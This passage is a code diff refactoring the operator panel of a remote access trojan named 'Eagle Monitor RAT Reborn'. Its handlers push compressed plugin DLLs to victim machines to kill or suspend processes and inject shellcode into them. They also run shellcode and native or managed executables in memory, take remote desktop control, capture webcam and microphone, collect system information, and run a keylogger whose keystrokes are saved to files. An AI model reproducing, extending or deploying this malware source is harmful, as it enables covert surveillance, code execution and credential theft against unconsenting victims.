-                ProcessKillerPacket processKillerPacket = new ProcessKillerPacket(procId, selected.Cells[2].Value.ToString(), selected.Index);
-                processKillerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1);
-                clientHandler.SendPacket(processKillerPacket);
+                ProcessKillerPacket processKillerPacket = new ProcessKillerPacket(procId, selected.Cells[2].Value.ToString(), selected.Index)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
+                };
+                ClientHandler.StartSendData(ClientHandler, processKillerPacket);
             }
         }
 
@@ -749,9 +708,11 @@ namespace Eagle_Monitor_RAT_Reborn
             foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
             {
                 int procId = int.Parse(selected.Cells[1].Value.ToString());
-                SuspendProcessPacket suspendProcessPacket = new SuspendProcessPacket(procId, selected.Cells[2].Value.ToString(), selected.Index);
-                suspendProcessPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1);
-                clientHandler.SendPacket(suspendProcessPacket);
+                SuspendProcessPacket suspendProcessPacket = new SuspendProcessPacket(procId, selected.Cells[2].Value.ToString(), selected.Index)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
+                };
+                ClientHandler.StartSendData(ClientHandler, suspendProcessPacket);
             }
         }
 
@@ -760,14 +721,17 @@ namespace Eagle_Monitor_RAT_Reborn
             foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
             {
                 int procId = int.Parse(selected.Cells[1].Value.ToString());
-                ResumeProcessPacket resumeProcessPacket = new ResumeProcessPacket(procId, selected.Cells[2].Value.ToString(), selected.Index);
-                resumeProcessPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1);
-                clientHandler.SendPacket(resumeProcessPacket);
+                ResumeProcessPacket resumeProcessPacket = new ResumeProcessPacket(procId, selected.Cells[2].Value.ToString(), selected.Index)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
+                };
+                ClientHandler.StartSendData(ClientHandler, resumeProcessPacket);
             }
         }
 
         private void shellcodeInjectionToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            ProcessInjectionPacket processInjectionPacket;
             using (OpenFileDialog ofd = new OpenFileDialog())
             {
                 if (ofd.ShowDialog() == DialogResult.OK)
@@ -779,14 +743,18 @@ namespace Eagle_Monitor_RAT_Reborn
                         switch (Program.settings.processInjectionMethod)
                         {
                             case ProcessInjectionPacket.INJECTION_METHODS.CLASSIC:
-                                ProcessInjectionPacket processInjectionPacket = new ProcessInjectionPacket(payload, ProcessInjectionPacket.INJECTION_METHODS.CLASSIC, procId);
-                                processInjectionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1);
-                                clientHandler.SendPacket(processInjectionPacket);
+                                processInjectionPacket = new ProcessInjectionPacket(payload, ProcessInjectionPacket.INJECTION_METHODS.CLASSIC, procId)
+                                {
+                                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
+                                };
+                                ClientHandler.StartSendData(ClientHandler, processInjectionPacket);
                                 break;
                             case ProcessInjectionPacket.INJECTION_METHODS.MAP_VIEW:
-                                processInjectionPacket = new ProcessInjectionPacket(payload, ProcessInjectionPacket.INJECTION_METHODS.MAP_VIEW, procId);
-                                processInjectionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1);
-                                clientHandler.SendPacket(processInjectionPacket);
+                                processInjectionPacket = new ProcessInjectionPacket(payload, ProcessInjectionPacket.INJECTION_METHODS.MAP_VIEW, procId)
+                                {
+                                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
+                                };
+                                ClientHandler.StartSendData(ClientHandler, processInjectionPacket);
                                 break;
                         }
                     }
@@ -804,22 +772,22 @@ namespace Eagle_Monitor_RAT_Reborn
         {
             if (captureGuna2ToggleSwitch.Checked)
             {
-                remoteDesktopHandler = new RemoteDesktopHandler();
+                RemoteDesktopHandler = new RemoteDesktopHandler();
                 keysPressed = new List<Keys>();
-                this.remoteDesktopHandler = new RemoteDesktopHandler();
-                remoteDesktopHandler.baseIp = this.clientHandler.IP;
+                this.RemoteDesktopHandler = new RemoteDesktopHandler();
+                RemoteDesktopHandler.BaseIp = this.ClientHandler.IP;
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                 {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
-                    baseIp = this.clientHandler.IP,
-                    HWID = this.clientHandler.HWID,
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
+                    BaseIp = this.ClientHandler.IP,
+                    HWID = this.ClientHandler.HWID,
                     width = remoteDesktopPictureBox.Width,
                     height = remoteDesktopPictureBox.Height,
                     format = "JPEG",
                     quality = qualityGuna2TrackBar.Value,
                     timeMS = 1
                 };
-                this.clientHandler.SendPacket(remoteViewerPacket);
+                ClientHandler.StartSendData(this.ClientHandler, remoteViewerPacket);
             }
             else
             {
@@ -827,10 +795,10 @@ namespace Eagle_Monitor_RAT_Reborn
                 keyboardGuna2ToggleSwitch.Checked = false;
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
                 {
-                    baseIp = this.remoteDesktopHandler.baseIp,
-                    HWID = this.clientHandler.HWID
+                    BaseIp = this.RemoteDesktopHandler.BaseIp,
+                    HWID = this.ClientHandler.HWID
                 };
-                this.remoteDesktopHandler.clientHandler.SendPacket(remoteViewerPacket);
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, remoteViewerPacket);
             }
         }
         private void remoteDesktopPictureBox_SizeChanged(object sender, EventArgs e)
@@ -839,15 +807,15 @@ namespace Eagle_Monitor_RAT_Reborn
             {
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                 {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
-                    baseIp = this.clientHandler.IP,
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
+                    BaseIp = this.ClientHandler.IP,
                     width = remoteDesktopPictureBox.Width,
                     height = remoteDesktopPictureBox.Height,
                     format = "JPEG",
                     quality = qualityGuna2TrackBar.Value,
                     timeMS = 1
                 };
-                this.remoteDesktopHandler.clientHandler.SendPacket(remoteViewerPacket);
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, remoteViewerPacket);
             }
         }
         private void qualityGuna2TrackBar_ValueChanged(object sender, EventArgs e)
@@ -856,15 +824,15 @@ namespace Eagle_Monitor_RAT_Reborn
             {
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                 {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
-                    baseIp = this.clientHandler.IP,
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
+                    BaseIp = this.ClientHandler.IP,
                     width = remoteDesktopPictureBox.Width,
                     height = remoteDesktopPictureBox.Height,
                     format = "JPEG",
                     quality = qualityGuna2TrackBar.Value,
                     timeMS = 1
                 };
-                this.remoteDesktopHandler.clientHandler.SendPacket(remoteViewerPacket);
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, remoteViewerPacket);
             }
         }
 
@@ -883,10 +851,11 @@ namespace Eagle_Monitor_RAT_Reborn
             {
                 RemoteMousePacket mousePacket = new RemoteMousePacket(e.Delta == 120 ? RemoteMousePacket.MouseTypeAction.MOVE_WHEEL_UP : RemoteMousePacket.MouseTypeAction.MOVE_WHEEL_DOWN)
                 {
-                    x = e.X * this.remoteDesktopHandler.hResol / remoteDesktopPictureBox.Width,
-                    y = e.Y * this.remoteDesktopHandler.vResol / remoteDesktopPictureBox.Height
+                    x = e.X * this.RemoteDesktopHandler.HResol / remoteDesktopPictureBox.Width,
+                    y = e.Y * this.RemoteDesktopHandler.VResol / remoteDesktopPictureBox.Height,
+                    BaseIp = this.ClientHandler.IP
                 };
-                this.remoteDesktopHandler.clientHandler.SendPacket(mousePacket);
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, mousePacket);
             }
         }
 
@@ -904,9 +873,10 @@ namespace Eagle_Monitor_RAT_Reborn
                 if (e.Button == MouseButtons.Middle)
                     mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.MIDDLE_DOWN;
 
-                mousePacket.x = e.X * this.remoteDesktopHandler.hResol / remoteDesktopPictureBox.Width;
-                mousePacket.y = e.Y * this.remoteDesktopHandler.vResol / remoteDesktopPictureBox.Height;
-                this.remoteDesktopHandler.clientHandler.SendPacket(mousePacket);
+                mousePacket.x = e.X * this.RemoteDesktopHandler.HResol / remoteDesktopPictureBox.Width;
+                mousePacket.y = e.Y * this.RemoteDesktopHandler.VResol / remoteDesktopPictureBox.Height;
+                mousePacket.BaseIp = this.ClientHandler.IP;
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, mousePacket);
             }
         }
 
@@ -924,9 +894,10 @@ namespace Eagle_Monitor_RAT_Reborn
                 if (e.Button == MouseButtons.Middle)
                     mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.MIDDLE_UP;
 
-                mousePacket.x = e.X * this.remoteDesktopHandler.hResol / remoteDesktopPictureBox.Width;
-                mousePacket.y = e.Y * this.remoteDesktopHandler.vResol / remoteDesktopPictureBox.Height;
-                this.remoteDesktopHandler.clientHandler.SendPacket(mousePacket);
+                mousePacket.x = e.X * this.RemoteDesktopHandler.HResol / remoteDesktopPictureBox.Width;
+                mousePacket.y = e.Y * this.RemoteDesktopHandler.VResol / remoteDesktopPictureBox.Height;
+                mousePacket.BaseIp = this.ClientHandler.IP;
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, mousePacket);
             }
         }
 
@@ -934,11 +905,12 @@ namespace Eagle_Monitor_RAT_Reborn
         {
             if (enabledMouse)
             {
-                this.remoteDesktopHandler.clientHandler.SendPacket(new RemoteMousePacket
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, new RemoteMousePacket
                     (
                         RemoteMousePacket.MouseTypeAction.MOVE_MOUSE,
-                        e.X * this.remoteDesktopHandler.hResol / remoteDesktopPictureBox.Width,
-                        e.Y * this.remoteDesktopHandler.vResol / remoteDesktopPictureBox.Height)
+                        e.X * this.RemoteDesktopHandler.HResol / remoteDesktopPictureBox.Width,
+                        e.Y * this.RemoteDesktopHandler.VResol / remoteDesktopPictureBox.Height
+                    ){ BaseIp = this.ClientHandler.IP }
                     );
             }
         }
@@ -959,7 +931,7 @@ namespace Eagle_Monitor_RAT_Reborn
                 if (!IsLockKey(e.KeyCode))
                     e.Handled = true;
                 keysPressed.Remove(e.KeyCode);
-                this.remoteDesktopHandler.clientHandler.SendPacket(new RemoteKeyboardPacket((byte)e.KeyCode, false));
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, new RemoteKeyboardPacket((byte)e.KeyCode, false) { BaseIp = this.ClientHandler.IP });
             }
         }
 
@@ -974,7 +946,7 @@ namespace Eagle_Monitor_RAT_Reborn
                     return;
 
                 keysPressed.Add(e.KeyCode);
-                this.remoteDesktopHandler.clientHandler.SendPacket(new RemoteKeyboardPacket((byte)e.KeyCode, true));
+                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, new RemoteKeyboardPacket((byte)e.KeyCode, true) { BaseIp = this.ClientHandler.IP });
             }
         }
 
@@ -990,46 +962,53 @@ namespace Eagle_Monitor_RAT_Reborn
             if (this.remoteDesktopPictureBox.Image != null)
             {
                 string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
-                File.WriteAllBytes(this.clientHandler.clientPath + "\\" + "Screenshots\\" + Date + ".jpeg", PacketLib.Utils.ImageProcessing.ImageToBytes(this.remoteDesktopPictureBox.Image));
+                File.WriteAllBytes(this.ClientHandler.ClientPath + "\\" + "Screenshots\\" + Date + ".jpeg", PacketLib.Utils.ImageProcessing.ImageToBytes(this.remoteDesktopPictureBox.Image));
             }
         }
         #endregion
         #region "Remote WebCam"
         private void getWebCamToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            RemoteCameraPacket remoteCameraPacket = new RemoteCameraPacket();
-            remoteCameraPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteCamera.dll"), 1);
-            this.clientHandler.SendPacket(remoteCameraPacket);
+            RemoteCameraPacket remoteCameraPacket = new RemoteCameraPacket
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteCamera.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, remoteCameraPacket);
         }
 
         private void captureWebCamGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
         {
+            RemoteCameraCapturePacket remoteCameraCapturePacket;
             if (captureWebCamGuna2ToggleSwitch.Checked)
             {
-                this.remoteWebCamHandler = new RemoteWebCamHandler();
-                this.remoteWebCamHandler.hasAlreadyConnected = false;
+                this.RemoteWebCamHandler = new RemoteWebCamHandler
+                {
+                    HasAlreadyConnected = false
+                };
 
                 if (camerasGuna2ComboBox.Items.Count > 0 && camerasGuna2ComboBox.SelectedItem != null)
                 {
-                    RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_ON);
-
-                    remoteCameraCapturePacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteCamera.dll"), 1);
-                    remoteCameraCapturePacket.timeMS = 1;
-                    remoteCameraCapturePacket.index = camerasGuna2ComboBox.SelectedIndex;
-                    remoteCameraCapturePacket.quality = qualityGuna2TrackBar.Value;
-                    this.clientHandler.SendPacket(remoteCameraCapturePacket);
+                    remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_ON)
+                    {
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteCamera.dll"), 1),
+                        timeMS = 1,
+                        index = camerasGuna2ComboBox.SelectedIndex,
+                        quality = qualityGuna2TrackBar.Value,
+                        BaseIp = this.ClientHandler.IP
+                    };
+                    ClientHandler.StartSendData(this.ClientHandler, remoteCameraCapturePacket);
                 }
             }
             else
             {
-                if (clientHandler != null && camerasGuna2ComboBox.Items.Count > 0)
+                if (ClientHandler != null && camerasGuna2ComboBox.Items.Count > 0)
                 {
-                    RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF)
+                    remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF)
                     {
-                        baseIp = this.clientHandler.IP,
-                        HWID = this.clientHandler.HWID
+                        BaseIp = this.ClientHandler.IP,
+                        HWID = this.ClientHandler.HWID
                     };
-                    this.remoteWebCamHandler.clientHandler.SendPacket(remoteCameraCapturePacket);
+                    ClientHandler.StartSendData(this.RemoteWebCamHandler.ClientHandler, remoteCameraCapturePacket);
                 }
             }
         }
@@ -1039,7 +1018,7 @@ namespace Eagle_Monitor_RAT_Reborn
             if (this.remoteWebCamPictureBox.Image != null)
             {
                 string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
-                File.WriteAllBytes(this.clientHandler.clientPath + "\\" + "Camera\\" + Date + "." + "png", PacketLib.Utils.ImageProcessing.ImageToBytes(this.remoteWebCamPictureBox.Image));
+                File.WriteAllBytes(this.ClientHandler.ClientPath + "\\" + "Camera\\" + Date + "." + "png", PacketLib.Utils.ImageProcessing.ImageToBytes(this.remoteWebCamPictureBox.Image));
             }
         }
         #endregion
@@ -1056,42 +1035,50 @@ namespace Eagle_Monitor_RAT_Reborn
 
         private void remoteMicrophoneGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
         {
+            RemoteAudioCapturePacket remoteAudioCapturePacket;
             if (remoteMicrophoneGuna2ToggleSwitch.Checked)
             {
                 if (audioDevicesGuna2ComboBox.Items.Count > 0)
                 {
-                    this.remoteMicrophoneHandler = new RemoteMicrophoneHandler();
-                    this.remoteMicrophoneHandler.hasAlreadyConnected = false;
+                    this.RemoteMicrophoneHandler = new RemoteMicrophoneHandler
+                    {
+                        HasAlreadyConnected = false
+                    };
 
-                    this.remoteMicrophoneHandler.waveOut.DeviceNumber = currentMachineDevicesGuna2ComboBox.SelectedIndex;
-                    this.remoteMicrophoneHandler.waveOut.Init(this.remoteMicrophoneHandler.bufferedWaveProvider);
-                    this.remoteMicrophoneHandler.waveOut.Play();
+                    this.RemoteMicrophoneHandler.WaveOut.DeviceNumber = currentMachineDevicesGuna2ComboBox.SelectedIndex;
+                    this.RemoteMicrophoneHandler.WaveOut.Init(this.RemoteMicrophoneHandler.BufferedWaveProvider);
+                    this.RemoteMicrophoneHandler.WaveOut.Play();
 
-                    RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_ON);
-                    remoteAudioCapturePacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\AudioRecording.dll"), 1);
-                    remoteAudioCapturePacket.index = audioDevicesGuna2ComboBox.SelectedIndex;
-                    this.clientHandler.SendPacket(remoteAudioCapturePacket);
+                    remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_ON)
+                    {
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\AudioRecording.dll"), 1),
+                        index = audioDevicesGuna2ComboBox.SelectedIndex,
+                        BaseIp = this.ClientHandler.IP
+                    };
+                    ClientHandler.StartSendData(this.ClientHandler, remoteAudioCapturePacket);
                 }
             }
             else
             {
-                if (clientHandler != null)
+                if (ClientHandler != null)
                 {
-                    RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF)
+                    remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF)
                     {
-                        baseIp = this.clientHandler.IP,
-                        HWID = this.clientHandler.HWID
+                        BaseIp = this.ClientHandler.IP,
+                        HWID = this.ClientHandler.HWID
                     };
-                    this.remoteMicrophoneHandler.clientHandler.SendPacket(remoteAudioCapturePacket);
+                    ClientHandler.StartSendData(this.RemoteMicrophoneHandler.ClientHandler, remoteAudioCapturePacket);
                 }
             }
         }
 
         private void getMicrophonesToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            RemoteAudioPacket remoteAudioPacket = new RemoteAudioPacket();
-            remoteAudioPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\AudioRecording.dll"), 1);
-            this.clientHandler.SendPacket(remoteAudioPacket);
+            RemoteAudioPacket remoteAudioPacket = new RemoteAudioPacket
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\AudioRecording.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, remoteAudioPacket);
         }
         #endregion
         #region "Remote Execution"
@@ -1131,9 +1118,9 @@ namespace Eagle_Monitor_RAT_Reborn
             }
 
             if (remoteCodeExecution != null)
-                remoteCodeExecution.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1);
+                remoteCodeExecution.Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1);
 
-            this.clientHandler.SendPacket(remoteCodeExecution);
+            ClientHandler.StartSendData(this.ClientHandler, remoteCodeExecution);
         }
 
         private void testDotNetGuna2Button_Click(object sender, EventArgs e)
@@ -1264,9 +1251,11 @@ namespace Eagle_Monitor_RAT_Reborn
         {
             foreach (DataGridViewRow shellcode in shellcodeDataGridView.SelectedRows)
             {
-                MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_SHELLCODE, Compressor.QuickLZ.Compress(File.ReadAllBytes(shellcode.Cells[0].Value.ToString()), 1));
-                memoryExecutionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1);
-                this.clientHandler.SendPacket(memoryExecutionPacket);
+                MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_SHELLCODE, Compressor.QuickLZ.Compress(File.ReadAllBytes(shellcode.Cells[0].Value.ToString()), 1))
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
+                };
+                ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
             }
         }
 
@@ -1329,25 +1318,29 @@ namespace Eagle_Monitor_RAT_Reborn
 
         private void sendNativePEContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            MemoryExecutionPacket memoryExecutionPacket;
             foreach (DataGridViewRow nativePE in nativePEDataGridView.SelectedRows)
             {
                 if (nativePE.Cells[0].Value.ToString().EndsWith(".dll"))
                 {
-                    MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(nativePE.Cells[0].Value.ToString()), 1));
-                    memoryExecutionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1);
-                    this.clientHandler.SendPacket(memoryExecutionPacket);
+                    memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(nativePE.Cells[0].Value.ToString()), 1))
+                    {
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
+                    };
+                    ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
                 }
                 else
                 {
-                    MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(nativePE.Cells[0].Value.ToString()), 1));
-                    memoryExecutionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1);
-                    this.clientHandler.SendPacket(memoryExecutionPacket);
+                    memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_NATIVE_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(nativePE.Cells[0].Value.ToString()), 1))
+                    {
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
+                    };
+                    ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
                 }
             }
         }
         #endregion
         #region "Managed PE"
-
         private void managedPEDataGridView_MouseUp(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Left)
@@ -1384,20 +1377,25 @@ namespace Eagle_Monitor_RAT_Reborn
 
         private void sendManagedPEContextMenuStripToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            MemoryExecutionPacket memoryExecutionPacket;
             foreach (DataGridViewRow managedPE in managedPEDataGridView.SelectedRows)
             {
                 if (managedPE.Cells[0].Value.ToString().EndsWith(".dll"))
                 {
-                    MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(managedPE.Cells[0].Value.ToString()), 1));
-                    memoryExecutionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1);
-                    memoryExecutionPacket.managedEntryPoint = managedPE.Cells[1].Value.ToString();
-                    this.clientHandler.SendPacket(memoryExecutionPacket);
+                    memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_DLL, Compressor.QuickLZ.Compress(File.ReadAllBytes(managedPE.Cells[0].Value.ToString()), 1))
+                    {
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1),
+                        managedEntryPoint = managedPE.Cells[1].Value.ToString()
+                    };
+                    ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
                 }
                 else
                 {
-                    MemoryExecutionPacket memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(managedPE.Cells[0].Value.ToString()), 1));
-                    memoryExecutionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1);
-                    this.clientHandler.SendPacket(memoryExecutionPacket);
+                    memoryExecutionPacket = new MemoryExecutionPacket(PacketType.MEM_EXEC_MANAGED_PE, Compressor.QuickLZ.Compress(File.ReadAllBytes(managedPE.Cells[0].Value.ToString()), 1))
+                    {
+                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\MemoryExecution.dll"), 1)
+                    };
+                    ClientHandler.StartSendData(this.ClientHandler, memoryExecutionPacket);
                 }
             }
         }
@@ -1434,64 +1432,85 @@ namespace Eagle_Monitor_RAT_Reborn
         #region "Information"
         private void retrieveInformationGuna2Button_Click(object sender, EventArgs e)
         {
-            InformationPacket informationPacket;
-            informationPacket = new InformationPacket();
-            informationPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Information.dll"), 1);
-            this.clientHandler.SendPacket(informationPacket);
+            InformationPacket informationPacket = new InformationPacket
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Information.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, informationPacket);
+        }
+        private void retrieveNetworkGuna2Button_Click(object sender, EventArgs e)
+        {
+            NetworkInformationPacket networkInformationPacket = new NetworkInformationPacket
+            {
+                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Information.dll"), 1)
+            };
+            ClientHandler.StartSendData(this.ClientHandler, networkInformationPacket);
         }
         #endregion
         #region "Keylogger"
         private void keyloggerGuna2Button_Click(object sender, EventArgs e)
         {
+            KeylogPacket keylogPacket;
             if (this.keyloggerGuna2Button.Text == "Start")
             {
-                this.keyloggerHandler = new KeyloggerHandler();
-                KeylogPacket keylogPacket = new KeylogPacket();
-                keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1);
-                this.clientHandler.SendPacket(keylogPacket);
+                this.KeyloggerHandler = new KeyloggerHandler();
+                keylogPacket = new KeylogPacket
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1)
+                };
+                ClientHandler.StartSendData(this.ClientHandler, keylogPacket);
                 this.keyloggerGuna2Button.Text = "Stop";
             }
             else
             {
-                KeylogPacket keylogPacket = new KeylogPacket(this.clientHandler.IP, this.clientHandler.HWID);
-                keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1);
-                this.keyloggerHandler.clientHandler.SendPacket(keylogPacket);
+                keylogPacket = new KeylogPacket(this.ClientHandler.IP, this.ClientHandler.HWID)
+                {
+                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1)
+                };
+                ClientHandler.StartSendData(this.KeyloggerHandler.ClientHandler, keylogPacket);
                 this.keyloggerGuna2Button.Text = "Start";
-                File.WriteAllText(this.clientHandler.clientPath + "\\Keystrokes\\" + Misc.Utils.DateFormater() + ".txt", keystrokeRichTextBox.Text);
